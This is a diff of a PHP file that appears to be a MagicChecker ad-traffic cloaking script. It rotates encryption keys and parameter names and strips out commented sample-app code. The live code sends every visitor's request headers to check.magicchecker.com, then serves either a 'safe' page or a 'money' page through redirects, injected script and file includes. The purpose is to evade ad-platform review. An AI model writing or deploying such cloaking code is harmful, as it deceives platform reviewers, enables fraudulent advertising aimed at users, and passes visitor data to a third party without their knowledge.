@@ -5,12 +5,12 @@
 
 define('CAMPAIGN_ID', "80010d81b94c97329d81fb228a90f4af");
 define('REQUEST_LIVE_TIME', 3600);
-define('ENC_KEY', '0233e3a619f46369194fca2f6615c392');
-define('MP_PARAM_NAME', 'lg__id');
+define('ENC_KEY', '18b7f6fcef973aa09f4082ebf4f1eafc');
+define('MP_PARAM_NAME', '__rfid');
 define('NOT_FOUND_TEXT', '<h1>Page not found</h1>');
 define('CHECK_MCPROXY', 0);
-define('CHECK_MCPROXY_PARAM', '843e6ecb12b24f584306996c0f8e6e0f');
-define('CHECK_MCPROXY_VALUE', '87d26c5bc39b64d086057208d346cc6b3de82503628e217188f5a42481bd11e5');
+define('CHECK_MCPROXY_PARAM', '0e71821a0b8b20df8e1c387d264655e1');
+define('CHECK_MCPROXY_VALUE', '6ca4f23b553c9feacffafda5af1945c6eb0c83dcb9856f79ddc2e8e2f0d74a3f');
 
 function translateCurlError($code) {$output = '';$curl_errors = array(2  => "Can't init curl.",6  => "Can't resolve server's DNS of our domain. Please contact your hosting provider and tell them about this issue.",7  => "Can't connect to the server.",28 => "Operation timeout. Check you DNS setting.");if (isset($curl_errors[$code])) $output = $curl_errors[$code];else $output = "Error code: $code . Check if php cURL library installed and enabled on your server.";return $output;}
 function mc_encrypt($encrypt) {$key = ENC_KEY;$encrypt = serialize($encrypt);$iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM);$key = pack('H*', $key);$mac = hash_hmac('sha256', $encrypt, substr(bin2hex($key), -32));$passcrypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $encrypt.$mac, MCRYPT_MODE_CBC, $iv);$encoded = base64_encode($passcrypt).'|'.base64_encode($iv);return $encoded;}
@@ -29,7 +29,7 @@ function sendRequest($data, $path = 'index') {
     $headers = array('adapi' => '2.2');
     if ($path == 'index') $data['HTTP_MC_CACHE'] = checkCache(); if (CHECK_MCPROXY || (isset($_GET[CHECK_MCPROXY_PARAM]) && ($_GET[CHECK_MCPROXY_PARAM] == CHECK_MCPROXY_VALUE))) {if (trim($data['HTTP_MC_CACHE'])) {print 'mcproxy is ok';} else {print 'mcproxy error';}die();}
     $data_to_post = array("cmp"=> CAMPAIGN_ID,"headers" => $data,"adapi" => '2.2', "sv" => '14463.3');
-
+    
     $ch = curl_init("http://check.magicchecker.com/v2.2/" .$path .'.php');
     curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
@@ -38,30 +38,30 @@ function sendRequest($data, $path = 'index') {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data_to_post));
-    $output = curl_exec($ch);
+    $output = curl_exec($ch);    
     $info = curl_getinfo($ch);
-
+    
     if ((strlen($output) == 0) || ($info['http_code'] != 200)) {
         $curl_err_num = curl_errno($ch);
         curl_close($ch);
-
+        
         if ($curl_err_num != 0) {
-            header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');
+            header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');           
             print 'cURL error ' .$curl_err_num .': ' .translateCurlError($curl_err_num);
-        }
+        }    
         else {
-            if ($info['http_code'] == 500) {
-                header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');
-                print '<h1>503 Service Unavailable</h1>';
-            }
-            else {
-                header($_SERVER['SERVER_PROTOCOL'] .' ' .$info['http_code']);
-                print '<h1>Error ' .$info['http_code'] .'</h1>';
-            }
-        }
+                if ($info['http_code'] == 500) {
+                    header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');
+                    print '<h1>503 Service Unavailable</h1>';
+                }    
+                else {
+                    header($_SERVER['SERVER_PROTOCOL'] .' ' .$info['http_code']);
+                    print '<h1>Error ' .$info['http_code'] .'</h1>';
+                }
+        }    
         die();
-    }
-    curl_close($ch);
+    }    
+    curl_close($ch); 
     return $output;
 }
 
@@ -71,7 +71,7 @@ function isBlocked($testmode = false) {
     $result->isBlocked = false;
     $result->errorMessage = '';
     $data_headers = array();
-
+    
     foreach ( $_SERVER as $name => $value ) {
         if (is_array($value)) {
             $value = implode(', ', $value);
@@ -81,14 +81,14 @@ function isBlocked($testmode = false) {
         } else {
             $data_headers[$name] = 'TRIMMED: ' .substr($value, 0, 1024);
         }
-    }
-
+    }    
+    
     $output = sendRequest($data_headers);
     if ($output) {
         $result->hasResponce = true;
         $answer = json_decode($output, TRUE);
         if (isset($answer['ban']) && ($answer['ban'] == 1)) die();
-
+        
         if ($answer['success'] == 1) {
             foreach ($answer as $ak => $av) {
                 $result->{$ak} = $av;
@@ -105,12 +105,12 @@ function _redirectPage($url, $send_params, $return_url = false) {
     if ($send_params) {
         if ($_SERVER['QUERY_STRING'] != '') {
             if (strpos($url, '?') === false) {
-                $url .= '?' . $_SERVER['QUERY_STRING'];
+                    $url .= '?' . $_SERVER['QUERY_STRING'];
             } else {
-                $url .= '&' . $_SERVER['QUERY_STRING'];
+                    $url .= '&' . $_SERVER['QUERY_STRING'];
             }
         }
-    }
+    } 
 
     if ($return_url) return $url;
     else header("Location: $url", true, 302);
@@ -119,7 +119,7 @@ function _redirectPage($url, $send_params, $return_url = false) {
 function _includeFileName($url) {
     if (strpos($url, '/') !== false) {
         $url = ltrim(strrchr($url, '/'), '/');
-    }
+    }      
     if (strpos($url, '?') !== false) {
         $url = explode('?', $url);
         $url = $url[0];
@@ -127,7 +127,7 @@ function _includeFileName($url) {
     return $url;
 }
 
-////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////// 
 
 if (!isset($_POST['click'])) {
     if (isset($_GET[MP_PARAM_NAME])) {
@@ -139,12 +139,12 @@ if (!isset($_POST['click'])) {
                 include(_includeFileName($cdata[2]));
                 $show_404 = false;
             }
-        }
+        }    
         if ($show_404) {
             $protocol = $_SERVER['SERVER_PROTOCOL'] ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.1';
             header($protocol ." 404 Not Found");
             print NOT_FOUND_TEXT;
-            die();
+            die();             
         }
     }
     else {
@@ -153,7 +153,7 @@ if (!isset($_POST['click'])) {
             if (!$result->isBlocked && isset($result->js)) {
                 $clickdata = generate_click_id($result);
                 $insert_script = '<noscript><style>html,body{visibility:hidden;background-color:#ffffff!important;}</style><meta http-equiv="refresh" content="0; url=' ._redirectPage($result->sp, $result->safeUrlType, true) .'"></noscript><script type="text/javascript">window.click_id="' .$clickdata[0] .'";window.qt14="' .$clickdata[1] .'";window.fh76="' .$clickdata[2] .'";' .$result->js .'</script>';
-                if (($result->show_first == 1) && ($result->safeUrlType == 'redirect') ||
+                if (($result->show_first == 1) && ($result->safeUrlType == 'redirect') || 
                     ($result->show_first == 2) && ($result->moneyUrlType == 'redirect')) {
                     print '<html><head><title></title><meta charset="UTF-8">' .$insert_script .'</head><body></body></html>';
                 }
@@ -176,17 +176,17 @@ if (!isset($_POST['click'])) {
             }
             else {
                 if ($result->urlType == 'redirect') {
-                    _redirectPage($result->url, $result->send_params);
+                    _redirectPage($result->url, $result->send_params);       
                 }
                 else {
                     include _includeFileName($result->url);
                 }
-            }
+            }   
         }
         else {
             die('Error: ' .$result->errorMessage);
-        }
-    }
+        }  
+    }    
 }
 else {
     $click_id = mc_decrypt($_POST['click']);
@@ -212,8 +212,8 @@ else {
                 if (isset($_POST['pn'])) $update_data['pn'] = $_POST['pn'];
                 if (isset($_POST['or'])) $update_data['or'] = $_POST['or'];
                 if (isset($_POST['rn'])) $update_data['rn'] = $_POST['rn'];
-                updateClick($click_id, $update_data);
-
+                updateClick($click_id, $update_data);                
+                
                 if (($cdata[10] == 1) || (($cdata[10] == 2) && (($cdata[7] == 2) || (($cdata[7] == 1) && $cdata[8])))) {
                     print "<script>location.href=\"" .rebuildParams($cdata, 2) ."\";</script>";
                 }
@@ -221,7 +221,7 @@ else {
             else {
                 if (($cdata[9] == 1) || (($cdata[9] == 2) && (($cdata[7] == 1) || (($cdata[7] == 2) && $cdata[8])))) {
                     print "<script>location.href=\"" .rebuildParams($cdata) ."\";</script>";
-                }
+                }    
             }
         }
         else {
@@ -231,37 +231,3 @@ else {
         }
     }
 }
-//
-//require('../vendor/autoload.php');
-//
-//$app = new Silex\Application();
-//$app['debug'] = true;
-//
-//// Register the monolog logging service
-//$app->register(new Silex\Provider\MonologServiceProvider(), array(
-//    'monolog.logfile' => 'php://stderr',
-//));
-//
-//// Register view rendering
-//$app->register(new Silex\Provider\TwigServiceProvider(), array(
-//    'twig.path' => __DIR__.'/views',
-//));
-//
-//// Our web handlers
-//
-//$app->get('/', function() use($app) {
-//    $app['monolog']->addDebug('logging output.');
-//    return $app['twig']->render('index.twig');
-//});
-//
-//$app->get('/hello', function() use($app) {
-//    $app['monolog']->addDebug('logging output.');
-//    return str_repeat('Hello', getenv('TIMES'));
-//});
-//
-//$app->get('/cowsay', function() use($app) {
-//    $app['monolog']->addDebug('cowsay');
-//    return "<pre>".\Cowsayphp\Cow::say("Cool beans")."</pre>";
-//});
-//
-//$app->run();
